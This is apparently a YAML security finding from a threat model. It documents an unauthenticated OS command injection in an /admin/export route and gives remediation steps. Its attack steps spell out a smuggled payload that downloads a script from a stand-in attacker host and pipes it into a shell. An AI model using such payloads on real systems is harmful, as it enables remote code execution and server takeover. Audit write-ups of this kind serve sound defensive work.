- local_id: auth-002
  threat_category_id: TH-01
  additional_categories:
  - Elevation of Privilege
  stride: Tampering
  cwe: CWE-78
  title: OS command injection — server.js:23
  scenario: An unauthenticated attacker POSTs a crafted path value to /admin/export; the shell-interpolated exec() call at
    server.js:23 passes the value directly to /bin/sh, executing arbitrary OS commands with the application's runtime privileges.
  attack_steps:
  - 'Attacker sends POST /admin/export with JSON body `{"path": ". && curl attacker.com/shell.sh | sh"}`, requiring no authentication.'
  - exec() at server.js:23 expands the template literal to `tar -czf /tmp/export.tgz . && curl attacker.com/shell.sh | sh`
    and passes it to /bin/sh.
  - The injected command executes with the application's OS user privileges, enabling data exfiltration, credential theft,
    or persistent backdoor installation.
  evidence_summary: server.js:23 passes `req.body.path` directly into an exec() template literal without sanitization or authentication,
    proving any internet client can execute arbitrary shell commands with the application's OS privileges.
  impact_description: 'Full server compromise: the attacker gains OS-level code execution, enabling credential extraction
    from the environment, lateral movement to database and internal services, and persistent access to the host.'
  likelihood: High
  impact: Critical
  risk: Critical
  controls_in_place: None — architecture context confirms authentication is absent from /admin/export; no input validation
    is present in the route handler.
  mitigation_title: Enforce authentication and shell-safe invocation on /admin/export in server.js
  remediation:
    effort: Medium
    steps:
    - Apply authentication middleware to `/admin/export` before any other change so unauthenticated callers receive 401.
    - 'Replace `exec()` at server.js:23 with a shell-free spawn: resolve `req.body.path` using `path.resolve()`, confirm it
      falls within the permitted export base directory, then call `spawn(''tar'', [''-czf'', ''/tmp/export.tgz'', validatedPath],
      {shell: false})` — the array form of spawn never passes arguments through a shell.'
    - Add an integration test that submits `"; id"` as path and asserts a 400 or 403 response with no command output.
    code_example: null
    verification: 'Send `curl -s -X POST http://localhost:3000/admin/export -H ''Content-Type: application/json'' -d ''{"path":".
      && echo INJECTED"}'' | grep INJECTED` — output must be empty after the fix.'
    reference: OWASP Command Injection Prevention Cheat Sheet — https://cheatsheetseries.owasp.org/cheatsheets/OS_Command_Injection_Defense_Cheat_Sheet.html
